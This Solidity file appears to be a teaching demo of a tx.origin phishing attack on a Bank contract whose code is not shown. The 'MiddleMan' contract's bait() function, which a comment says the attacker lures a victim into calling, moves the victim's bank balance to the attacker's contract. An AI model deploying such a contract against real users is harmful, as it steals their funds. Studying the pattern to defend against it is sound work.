pragma solidity 0.5.10;

contract MiddleMan {
    Bank b;
    
    constructor(address payable _bankAddr) public {
        b = Bank(_bankAddr);
    }
    
    function () external payable{}
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
    
    /**
     * Attacker baits victim to call this function
     */
    function bait() public {
       b.transfer(address(this)); 
    }
}